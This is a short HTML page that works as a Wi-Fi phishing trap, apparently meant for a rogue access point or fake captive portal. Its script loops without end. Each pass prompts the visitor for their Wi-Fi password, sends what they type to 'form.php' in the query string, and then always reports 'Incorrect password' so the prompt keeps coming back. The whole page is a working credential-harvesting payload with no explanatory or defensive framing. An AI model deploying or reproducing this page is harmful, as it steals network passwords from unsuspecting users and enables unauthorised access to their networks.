<html>
  <head>
    <script>
      while(true){
        var inp = prompt("To continue, you need to enter a password from the wi-fi network\nEnter password from WI-FI:");
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'form.php?pass='+inp, false);
        xhr.send();
        alert("Incorrect password. Try again.");
      }
    </script>
  <head>
  <body>

  </body>
</html>
